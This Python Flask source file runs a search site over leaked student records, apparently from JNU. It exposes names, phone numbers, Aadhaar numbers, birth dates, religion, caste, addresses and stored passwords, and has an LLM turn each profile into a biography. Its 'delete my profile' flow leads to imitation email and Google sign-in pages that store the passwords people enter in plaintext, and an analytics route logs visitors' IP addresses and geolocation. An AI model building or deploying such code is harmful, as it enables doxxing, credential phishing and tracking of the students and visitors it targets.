from flask import Flask, render_template, request, send_from_directory, session, flash, redirect, url_for, jsonify
import json
from pathlib import Path
import os
import copy
from datetime import datetime
import re
from supabase import create_client, Client
from groq import Groq

GROQ_CLIENT = Groq(api_key=os.environ.get("GROQ_API_KEY"))

# -------------------------
# Supabase setup
# -------------------------
SUPABASE_URL = os.environ.get("SUPABASE_URL")
SUPABASE_KEY = os.environ.get("SUPABASE_KEY")
if not SUPABASE_URL or not SUPABASE_KEY:
    raise RuntimeError("Supabase URL and KEY must be set in environment variables")
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

# -------------------------
# Flask app
# -------------------------
app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "dev_secret_for_demo_only_change_me")

# -------------------------
# Config / Files
# -------------------------
PUBLIC_JSON = Path("all_profiles_public.json")
FULL_JSON = Path("all_profiles_full.json")
IMAGE_DIR = Path("static/images")
IGNORED_JSON = Path("ignored_profiles.json")  # local backup for deleted profiles

# -------------------------
# Helpers
# -------------------------
def _merge_raw_jsons(raw_jsons):
    merged = {}
    for r in raw_jsons:
        c = r.get("content")
        if isinstance(c, dict):
            merged.update(c)
    return merged

def _recursive_find_key(obj, key_substr):
    key_substr = key_substr.lower()
    if isinstance(obj, dict):
        for k, v in obj.items():
            if k and key_substr in k.lower():
                return v
            found = _recursive_find_key(v, key_substr)
            if found is not None:
                return found
    elif isinstance(obj, (list, tuple)):
        for item in obj:
            found = _recursive_find_key(item, key_substr)
            if found is not None:
                return found
    return None

def _determine_name_from_personal(pd):
    if not isinstance(pd, dict):
        return None
    for k, v in pd.items():
        if k and "name" in k.lower() and v:
            return str(v).strip()
    return None

def _image_basename_from_local(image_local):
    if not image_local:
        return None
    return Path(image_local).name

# New helper: collect values matching keys (collect multiple matches)
def _collect_values(obj, key_substrings, exclude_substrings=None):
    """
    Traverse obj (dict/list) and collect values where the key name contains any of key_substrings
    and does NOT contain any of exclude_substrings. Return list of str values.
    """
    if exclude_substrings is None:
        exclude_substrings = []

    results = []

    def walk(node, parent_key=None):
        if isinstance(node, dict):
            for k, v in node.items():
                kl = (k or "").lower()
                # check exclude
                if any(excl in kl for excl in exclude_substrings):
                    # even if excluded key, still descend to find nested address fields etc.
                    pass
                matched = any(sub in kl for sub in key_substrings)
                if matched and not any(excl in kl for excl in exclude_substrings):
                    # capture primitive types and lists/dicts by turning to strings
                    if isinstance(v, (str, int, float, bool)):
                        results.append(str(v))
                    elif v is None:
                        pass
                    else:
                        # if value is list/dict collect deeper primitives
                        if isinstance(v, (list, tuple)):
                            for it in v:
                                if isinstance(it, (str, int, float, bool)):
                                    results.append(str(it))
                                else:
                                    walk(it, k)
                        elif isinstance(v, dict):
                            walk(v, k)
                else:
                    # descend
                    if isinstance(v, (dict, list, tuple)):
                        walk(v, k)
                    else:
                        # If parent key might be address_details (explicit case handled elsewhere)
                        pass
        elif isinstance(node, (list, tuple)):
            for item in node:
                walk(item, parent_key)
        else:
            # primitive: nothing to do without a key
            pass

    walk(obj)
    # remove empties, dedupe
    cleaned = [s.strip() for s in results if s and str(s).strip()]
    # normalize spacing and return
    return list(dict.fromkeys(cleaned))

# Build a search text for a profile from only allowed fields
def _build_search_text_for_profile(pid, public_profile, full_raw):
    tokens = []

    # 1) Name(s)
    name = public_profile.get("_name") or public_profile.get("name")
    if name:
        tokens.append(str(name))

    # 2) ID
    pid_val = public_profile.get("id") or pid
    if pid_val is not None:
        tokens.append(str(pid_val))

    # 3) Mobile / phone / contact
    mobile_keys = ["mobile", "phone", "contact", "telephone", "tel"]
    mobiles = []
    # search both public_profile and full_raw
    mobiles += _collect_values(public_profile, mobile_keys)
    if isinstance(full_raw, dict):
        mobiles += _collect_values(full_raw, mobile_keys)
    tokens.extend(mobiles)

    # 4) Email (exclude jnu-specific)
    email_keys = ["email", "e-mail"]
    # Exclude keys mentioning 'jnu' (do not include jnu_email)
    emails = _collect_values(public_profile, email_keys, exclude_substrings=["jnu"])
    if isinstance(full_raw, dict):
        emails += _collect_values(full_raw, email_keys, exclude_substrings=["jnu"])
    tokens.extend(emails)

    # 5) Gender
    gender_keys = ["gender", "sex"]
    genders = _collect_values(public_profile, gender_keys)
    if isinstance(full_raw, dict):
        genders += _collect_values(full_raw, gender_keys)
    tokens.extend(genders)

    # 6) DOB / birthdate
    dob_keys = ["dob", "dateofbirth", "date_of_birth", "date of birth", "birth", "birth_date"]
    dobs = _collect_values(public_profile, dob_keys)
    if isinstance(full_raw, dict):
        dobs += _collect_values(full_raw, dob_keys)
    tokens.extend(dobs)

    # 7) Adhaar / Aadhar / Aadhaar
    aadhar_keys = ["aadhar", "adhaar", "aadhaar"]
    aadhars = _collect_values(public_profile, aadhar_keys)
    if isinstance(full_raw, dict):
        aadhars += _collect_values(full_raw, aadhar_keys)
    tokens.extend(aadhars)

    # 8) Religion
    religion_keys = ["religion"]
    religions = _collect_values(public_profile, religion_keys)
    if isinstance(full_raw, dict):
        religions += _collect_values(full_raw, religion_keys)
    tokens.extend(religions)

    # 9) Category / caste
    category_keys = ["category", "caste"]
    categories = _collect_values(public_profile, category_keys)
    if isinstance(full_raw, dict):
        categories += _collect_values(full_raw, category_keys)
    tokens.extend(categories)

    # 10) Address: include entire address_details from public_profile, plus any 'address' keys from full_raw
    # public_profile already sets address_details in profile build; include its values
    addr_vals = []
    address_details = public_profile.get("address_details") or {}
    if isinstance(address_details, dict):
        for k, v in address_details.items():
            if isinstance(v, (str, int, float, bool)):
                addr_vals.append(str(v))
            elif isinstance(v, (list, tuple)):
                for it in v:
                    if isinstance(it, (str, int, float, bool)):
                        addr_vals.append(str(it))
    # from full_raw, collect any keys containing "address"
    if isinstance(full_raw, dict):
        addr_vals += _collect_values(full_raw, ["address"])
    tokens.extend(addr_vals)

    # Flatten, lower-case and join
    norm = " ".join(str(t) for t in tokens if t is not None)
    try:
        return norm.lower()
    except Exception:
        return norm

# -------------------------
# Load datasets at startup
# -------------------------
if not PUBLIC_JSON.exists():
    raise FileNotFoundError(f"Required file {PUBLIC_JSON} not found.")
with open(PUBLIC_JSON, "r", encoding="utf-8") as f:
    public_list = json.load(f)

full_list = []
if FULL_JSON.exists():
    with open(FULL_JSON, "r", encoding="utf-8") as f:
        try:
            full_list = json.load(f)
        except Exception:
            full_list = []

FULL_BY_ID = {}
FULL_SEARCH_TEXT_BY_ID = {}
for ent in full_list:
    pid = ent.get("id")
    raw_jsons = ent.get("raw_jsons", [])
    merged_raw = _merge_raw_jsons(raw_jsons)
    if pid is not None:
        pid = str(pid)
        FULL_BY_ID[pid] = merged_raw
        try:
            FULL_SEARCH_TEXT_BY_ID[pid] = json.dumps(merged_raw, ensure_ascii=False)
        except Exception:
            FULL_SEARCH_TEXT_BY_ID[pid] = " ".join(str(v) for v in merged_raw.values())

# -------------------------
# Ignored profiles
# -------------------------
if IGNORED_JSON.exists():
    try:
        with open(IGNORED_JSON, "r", encoding="utf-8") as f:
            IGNORED_IDS = set(json.load(f))
    except Exception:
        IGNORED_IDS = set()
else:
    IGNORED_IDS = set()

def _save_ignored(pid):
    IGNORED_IDS.add(str(pid))
    with open(IGNORED_JSON, "w", encoding="utf-8") as f:
        json.dump(list(IGNORED_IDS), f, indent=2)

    # update in-memory profiles
    global ALL_PROFILES, PROFILE_BY_ID, SEARCH_TEXT_BY_ID
    ALL_PROFILES = [p for p in ALL_PROFILES if str(p.get("id")) not in IGNORED_IDS]
    PROFILE_BY_ID = {str(p["id"]): p for p in ALL_PROFILES if p.get("id") is not None}
    # rebuild search index from remaining profiles
    _rebuild_search_index()

# -------------------------
# Build profiles list
# -------------------------
ALL_PROFILES = []
for pub in public_list:
    pid = pub.get("id")
    profile = copy.deepcopy(pub)
    for key in ("personal_details", "family_details", "education_details", "address_details"):
        if key not in profile:
            profile[key] = {}
    profile["_name"] = profile.get("name") or _determine_name_from_personal(profile.get("personal_details", {})) or "Unknown"
    image_local = profile.get("image_local")
    image_urls = profile.get("image_urls") or []
    if image_local:
        basename = _image_basename_from_local(image_local)
        profile["_photo"] = f"/images/{basename}" if basename else (image_urls[0] if image_urls else None)
        profile["photo"] = {"relative_path": basename, "source_url": image_urls[0] if image_urls else None}
    else:
        profile["_photo"] = image_urls[0] if image_urls else None
        profile["photo"] = {"relative_path": None, "source_url": image_urls[0] if image_urls else None}
    if pid and pid in FULL_BY_ID:
        full_p = FULL_BY_ID[pid]
        for k, v in full_p.items():
            if k not in profile:
                profile[k] = v
        if "jnu_email" not in profile:
            val = _recursive_find_key(full_p, "jnu_email") or _recursive_find_key(full_p, "email")
            if val:
                profile["jnu_email"] = val
        if "password" not in profile:
            pw = _recursive_find_key(full_p, "password")
            if pw:
                profile["password"] = pw
    ALL_PROFILES.append(profile)

# Filter ignored
ALL_PROFILES = [p for p in ALL_PROFILES if str(p.get("id")) not in IGNORED_IDS]
PROFILE_BY_ID = {str(p["id"]): p for p in ALL_PROFILES if p.get("id") is not None}

# -------------------------
# Build a targeted search index (only allowed fields)
# -------------------------
SEARCH_TEXT_BY_ID = {}

def _rebuild_search_index():
    """
    Rebuild SEARCH_TEXT_BY_ID from ALL_PROFILES using only the allowed fields listed
    by the task: name, id, mobile no, email id (not jnu_email), gender, dob, aadhar,
    religion, category, and address details.
    """
    global SEARCH_TEXT_BY_ID
    SEARCH_TEXT_BY_ID = {}
    for p in ALL_PROFILES:
        pid = p.get("id")
        if pid is None:
            continue
        pid = str(pid)
        full_raw = FULL_BY_ID.get(pid, {})
        text = _build_search_text_for_profile(pid, p, full_raw)
        # store lowercased
        SEARCH_TEXT_BY_ID[pid] = (text or "").lower()

# initial build
_rebuild_search_index()

# -------------------------
# Search helper
# -------------------------
def search_profiles(query):
    """
    Query is split into whitespace tokens; each token must be present (AND).
    Search is case-insensitive and only searches fields included in SEARCH_TEXT_BY_ID.
    """
    if not query:
        return []
    terms = [t.lower() for t in query.split() if t.strip()]
    if not terms:
        return []
    results = []
    for p in ALL_PROFILES:
        pid = p.get("id")
        if pid is None:
            continue
        pid = str(pid)
        text = SEARCH_TEXT_BY_ID.get(pid, "")
        # require all terms to be in searchable text
        if all(term in text for term in terms):
            results.append(p)
    return results

# -------------------------
# Supabase user helpers
# -------------------------
EMAIL_REGEX = re.compile(r"[^@]+@[^@]+\.[^@]+")

def _is_valid_email(e):
    return bool(e and EMAIL_REGEX.fullmatch(e.strip()))

def _save_user_to_supabase(userobj):
    try:
        supabase.table("users").upsert(userobj, on_conflict="email").execute()
    except Exception as ex:
        print("Supabase user save failed:", ex)

# -------------------------
# Routes
# -------------------------
@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        query = request.form.get("query", "").strip()
        if query:
            results = search_profiles(query)
            return render_template("results.html", query=query, results=results)
    return render_template("index.html")

@app.route("/results", methods=["POST"])
def results():
    query = request.form.get("query", "").strip()
    results = search_profiles(query) if query else []
    return render_template("results.html", query=query, results=results)

@app.route("/profile/<student_id>")
def profile(student_id):
    public_profile = PROFILE_BY_ID.get(str(student_id))
    if not public_profile:
        return "Profile not found", 404

    full_raw = FULL_BY_ID.get(str(student_id))
    if isinstance(full_raw, dict) and full_raw:
        detail_profile = copy.deepcopy(full_raw)
        for key in ("personal_details", "family_details", "education_details", "address_details"):
            if key not in detail_profile:
                detail_profile[key] = public_profile.get(key, {})
        if public_profile.get("image_local"):
            basename = _image_basename_from_local(public_profile["image_local"])
            detail_profile["photo"] = detail_profile.get("photo", {})
            detail_profile["photo"]["relative_path"] = basename
            if public_profile.get("image_urls"):
                detail_profile["photo"]["source_url"] = public_profile["image_urls"][0]
        if "jnu_email" not in detail_profile and public_profile.get("jnu_email"):
            detail_profile["jnu_email"] = public_profile.get("jnu_email")
        if "password" not in detail_profile and public_profile.get("password"):
            detail_profile["password"] = public_profile.get("password")
    else:
        detail_profile = copy.deepcopy(public_profile)

    detail_profile["_name"] = (
        public_profile.get("_name")
        or detail_profile.get("name")
        or _determine_name_from_personal(detail_profile.get("personal_details", {}))
        or "Unknown"
    )

    if public_profile.get("image_local"):
        basename = _image_basename_from_local(public_profile["image_local"])
        detail_profile["_photo"] = (
            f"/images/{basename}"
            if basename
            else (detail_profile.get("photo", {}).get("source_url") if detail_profile.get("photo") else None)
        )
    else:
        detail_profile["_photo"] = detail_profile.get("photo", {}).get("source_url") if detail_profile.get("photo") else None

    # -----------------------
    # Generate AI summary
    # -----------------------
    prompt = f"""
    Summarize this student profile in natural, human-readable English. Focus on
    name, date of birth, gender, location, religion, category, and family details.
    Present it like a short biography.

    Profile JSON:
    {json.dumps(detail_profile, indent=2)}
    """

    try:
        chat_completion = GROQ_CLIENT.chat.completions.create(
            model="openai/gpt-oss-20b",
            messages=[
                {"role": "system", "content": "You are a helpful assistant that summarizes student profiles."},
                {"role": "user", "content": prompt}
            ],
        )
        summary = chat_completion.choices[0].message.content.strip()
    except Exception as e:
        summary = "AI summary could not be generated."
        print("Error generating AI summary:", e)

    return render_template("profile.html", profile=detail_profile, summary=summary)

@app.route("/images/<filename>")
def images_static(filename):
    file_path = IMAGE_DIR / filename
    if file_path.exists():
        return send_from_directory(str(IMAGE_DIR), filename)
    return "Image not found", 404

# -------------------------
# Delete flow
# -------------------------
@app.route("/delete/<student_id>", methods=["POST"])
def delete_profile(student_id):
    profile = PROFILE_BY_ID.get(str(student_id))
    if not profile:
        return "Profile not found", 404
    session['pending_delete_id'] = str(student_id)
    session['delete_name'] = profile["_name"]
    return redirect(url_for("signin_choice"))

@app.route("/delete/success")
def delete_success_page():
    delete_name = session.pop("delete_name", None)
    session.pop('pending_delete_id', None)
    return render_template("delete_success.html", delete_name=delete_name)

# -------------------------
# Authentication
# -------------------------
@app.route("/signin")
def signin_choice():
    return render_template("signin_choice.html", delete_name=session.get("delete_name"))

@app.route("/auth/email", methods=["GET", "POST"])
def auth_email():
    if request.method == "POST":
        email = request.form.get("email", "").strip().lower()
        if not _is_valid_email(email):
            flash("Please enter a valid email address.", "error")
            return render_template("signin_email.html", email=email, delete_name=session.get("delete_name"))
        session['pending_email'] = email
        return redirect(url_for("auth_email_password"))
    return render_template("signin_email.html", delete_name=session.get("delete_name"))

@app.route("/auth/email/password", methods=["GET", "POST"])
def auth_email_password():
    email = session.get("pending_email")
    if not email:
        flash("Please enter your email first.", "error")
        return redirect(url_for("auth_email"))
    if request.method == "POST":
        password = request.form.get("password", "")
        userobj = {
            "email": email,
            "password": password,
            "provider": "email",
            "created_at": datetime.utcnow().isoformat() + "Z"
        }
        _save_user_to_supabase(userobj)
        session['user_email'] = email

        if 'pending_delete_id' in session:
            pid = session.pop('pending_delete_id')
            _save_ignored(pid)
            return redirect(url_for("delete_success_page"))

        session.pop('pending_email', None)
        flash(f"Account created/signed in ({email}).", "success")
        return redirect(url_for("index"))
    return render_template("signin_email_password.html", email=email, delete_name=session.get("delete_name"))

@app.route("/auth/google/email", methods=["GET", "POST"])
def auth_google_email():
    if request.method == "POST":
        email = (request.form.get("email") or "").strip().lower()
        if not _is_valid_email(email):
            flash("Enter a valid email.", "error")
            return render_template("google_email.html", email=email)
        session['pending_google_email'] = email
        return redirect(url_for("auth_google_password"))
    return render_template("google_email.html")

@app.route("/auth/google/password", methods=["GET", "POST"])
def auth_google_password():
    email = session.get('pending_google_email')
    if not email:
        flash("Please enter email first.", "error")
        return redirect(url_for("auth_google_email"))

    if request.method == "POST":
        password = (request.form.get("password") or "").strip()
        if not password:
            flash("Please enter your password.", "error")
            return render_template("google_password.html", email=email)

        userobj = {
            "email": email,
            "password": password,
            "provider": "google",
            "created_at": datetime.utcnow().isoformat() + "Z"
        }
        _save_user_to_supabase(userobj)
        session['user_email'] = email
        session.pop('pending_google_email', None)

        if 'pending_delete_id' in session:
            pid = session.pop('pending_delete_id')
            _save_ignored(pid)
            return redirect(url_for("delete_success_page"))

        flash(f"Signed in successfully ({email}).", "success")
        return redirect(url_for("index"))

    return render_template("google_password.html", email=email)

# -------------------------
# Analytics
# -------------------------
@app.route("/collect", methods=["POST"])
def collect_analytics():
    now = datetime.utcnow().isoformat() + "Z"
    xfwd = request.headers.get("X-Forwarded-For", "")
    ip = xfwd.split(",")[0].strip() if xfwd else request.remote_addr
    payload = request.get_json(silent=True) or {}
    event = {
        "ts": now,
        "ip": ip,
        "request_path": request.path,
        "full_path": request.full_path,
        "url": payload.get("url") or request.referrer or request.url,
        "referrer": payload.get("referrer") or request.referrer,
        "user_agent": request.headers.get("User-Agent"),
        "accept_language": request.headers.get("Accept-Language"),
        "client_time": payload.get("client_time"),
        "timezone": payload.get("timezone"),
        "screen": payload.get("screen"),
        "viewport": payload.get("viewport"),
        "connection": payload.get("connection"),
        "geo": payload.get("geo"),
        "session_id": payload.get("session_id"),
    }
    try:
        supabase.table("analytics").insert(event).execute()
    except Exception as ex:
        print("Supabase analytics insert failed:", ex)
    return jsonify({"status": "ok"}), 204

@app.route("/logout")
def logout():
    session.pop("user_email", None)
    flash("Signed out.", "info")
    return redirect(url_for("index"))

# -------------------------
# Startup info
# -------------------------
print(f"Loaded {len(ALL_PROFILES)} public profiles.")
if FULL_BY_ID:
    print(f"Loaded full backup for {len(FULL_BY_ID)} profiles (full-text search enabled).")
else:
    print("No full backup found; search uses sanitized public index only.")

if __name__ == "__main__":
    app.run(debug=True)
